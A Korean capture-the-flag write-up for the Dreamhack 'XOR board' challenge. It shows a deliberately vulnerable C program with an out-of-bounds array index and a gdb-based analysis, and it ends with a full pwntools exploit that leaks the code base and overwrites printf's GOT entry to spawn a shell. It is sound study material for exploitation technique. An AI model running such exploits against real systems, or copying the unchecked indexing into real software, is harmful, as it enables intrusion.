# Level3:XOR board

## 문제 링크

---

https://dreamhack.io/wargame/challenges/1211

## Description

---

**여기에서는 XOR이 어떻게 동작하는지 배울 수 있어요!**

**혹시** `win` **함수를 부르는 방법을 찾을 수 있나요?**

## Environment

---

```python
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

## Background

---

- XOR
- Out of Bound
- GOT Overwrite

## 코드 분석

---

### code

- 아래는 문제에서 제공하는 `main.c` 코드이다.

```bash
// gcc -o main main.c -Wl,-z,norelro

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>

uint64_t arr[64] = {0};

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    for (int i = 0; i < 64; i++)
        arr[i] = 1ul << i;
}

void print_menu() {
    puts("1. XOR two values");
    puts("2. Print one value");
    printf("> ");
}

void xor() {
    int32_t i, j;
    printf("Enter i & j > ");
    scanf("%d%d", &i, &j);
    arr[i] ^= arr[j];
}

void print() {
    uint32_t i;
    printf("Enter i > ");
    scanf("%d", &i);
    printf("Value: %lx\n", arr[i]);
}

void win() {
    system("/bin/sh");
}

int main() {
    int option, i, j;
    initialize();
    while (1) {
        print_menu();
        scanf("%d", &option);
        if (option == 1) {
            xor();
        } else if (option == 2) {
            print();
        } else {
            break;
        }
    }

    return 0;

```

- `arr` 에는 각 LSB부터 MSB까지 한 비트씩 1이 활성화 되어있다
    - `arr[0]` = `0x1`
    - `arr[1]` = `0x2`
    - `arr[63]` = `0x8000000000000000`
- `xor` , `print` 함수에 Out of Bound 취약점이 존재함을 알 수 있다.
    - 이를 이용하여 `code_base` 를 알아낸 후, `win` 함수를 호출하면 쉘을 획득할 수 있다.

### gdb

- `print` 를 이용하여 `arr` 및 주변 값을 확인할 수 있기 때문에, `arr` 과 가까운 곳에 `code` 영역에 존재하는 값이 있는지 확인하였다.
- 다음과 같이 `arr` 의 주소를 알아낼 수 있다.

![스크린샷 2025-02-19 오후 8.28.19.png](Level3%20XOR%20board%2019ebdeddcfd880148e48faf953178a1e/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-19_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_8.28.19.png)

- `arr` 주변에 Global Offest Table이 존재하였고, 조금 더 위에 `0x55555555` 로 시작하는 값들이 존재하였다.

![스크린샷 2025-02-19 오후 8.29.12.png](Level3%20XOR%20board%2019ebdeddcfd880148e48faf953178a1e/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-19_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_8.29.12.png)

- 구현상에 실수를 했는지 값이 변하는진 모르겠지만, `0x55555555` 로 시작하는 저 값들 중 `code_base` 를 구할 수 있는 것이 있고, 없는 것이 있었다.
- 그 중 최대한 오프셋이 고정적일 **것** 같은 값을 찾아서 사용하려고 하였다.
- 해당 값을 선택한 **나름** 논리적인 이유는 다음과 같다.
- 현재 Global Offset Table은 `0x555555557428` 부터 시작한다.

![스크린샷 2025-02-19 오후 8.37.05.png](Level3%20XOR%20board%2019ebdeddcfd880148e48faf953178a1e/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-19_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_8.37.05.png)

- `arr` 근처의 값을 확인하던 중 `0x5555555572f8` 에 `0x0000555555557410` 값이 존재하였다.

![스크린샷 2025-02-19 오후 8.34.00.png](Level3%20XOR%20board%2019ebdeddcfd880148e48faf953178a1e/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-19_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_8.34.00.png)

- 뭔가 연관이 있을 것 같아서.. 선택했다..
- `code_base` 와의 오프셋은 `0x3410` 이다.

![스크린샷 2025-02-19 오후 8.41.32.png](Level3%20XOR%20board%2019ebdeddcfd880148e48faf953178a1e/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-19_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_8.41.32.png)

- 해당 값을 이용하여 `code_base` 를 구하고, GOT Overwrite를 이용하여 `win` 을 호출하면 쉘을 획득할 수 있다.

### print

- OOB를 이용하여 `arr` 배열보다 주소가 작은 값, 즉 **인덱스가 음수인 원소**에 접근해야 하는데, `print()` 함수에서 OOB를 사용하면 Segmentation fault가 발생하였다.
- `gdb` 로 확인하면 그 이유를 찾을 수 있다.
- 아래는 `print()` 함수에서 `scanf` 이후 동작이다.

![스크린샷 2025-02-19 오후 8.47.29.png](Level3%20XOR%20board%2019ebdeddcfd880148e48faf953178a1e/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-19_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_8.47.29.png)

- `print + 94` 부분에서 `mov rax,QWORD PTR [rdx+rax*1]` 의 명령을 수행한다.
- 입력을 음수로 받으면, 최상위 비트가 활성화되어 큰 값으로 인식된다.
- 따라서 `[rdx+rax*1]` 에서 유효하지 않은 주소를 참조하기 때문에 Segmentation fault가 발생한다.

- `-3` 을 입력한 후 `scanf` 이후 흐름을 확인하면 아래와 같다.

![스크린샷 2025-02-19 오후 8.50.58.png](Level3%20XOR%20board%2019ebdeddcfd880148e48faf953178a1e/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-19_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_8.50.58.png)

- `rax` 는 `arr` 의 시작 주소를, `rdx` 는 `0x7ff` 로 시작하는 값임을 확인할 수 있다.

- 두 값을 더한 후, 메모리 매핑을 확인해보면 유효하지 않은 메모리임을 확인할 수 있다.

![스크린샷 2025-02-19 오후 8.52.48.png](Level3%20XOR%20board%2019ebdeddcfd880148e48faf953178a1e/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA_2025-02-19_%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE_8.52.48.png)

- 따라서 `xor` 을 이용하여 `arr` 배열에 원하는 값을 저장 후, `arr` 을 출력하도록 해야한다.

## 익스플로잇

---

### 익스플로잇 단계

- `xor` 에서 OOB를 이용하여 `arr` 에 `code` 영역 코드 저장
- `code_base` 및 `win` 의 값 계산
- `printf` 의 GOT값을 `win` 으로 Overwrite

### exploit.py

```python
from pwn import *

context.log_level = 'debug'

e = ELF('./main')
# p = e.process()
p = remote('host1.dreamhack.games', 13357)

def xor(ij):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', ij)

def print_arr(i):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', i)
    p.recvuntil(b'Value: ')
    return int(p.recvline(), 16)
    
def binary_magic(target, storage):
    for i in range(48):
        if target & (1 << i):
            ij = str(storage).encode() + b' ' + str(i).encode()
            xor(ij)

# Leak Code base & win
xor(b'0 -57')
code_base = print_arr(b'0') - 0x3411
win = code_base + e.sym.win
xor(b'0 -57')

# Leak printf's GOT
xor(b'0 -16')
printf_got = print_arr(b'0') - 1
xor(b'0 -16')

# Set arr[63] to win's address
xor(b'63 63')
binary_magic(win, 63)
binary_magic(printf_got, 63)

xor(b'-16 63')

p.interactive()

```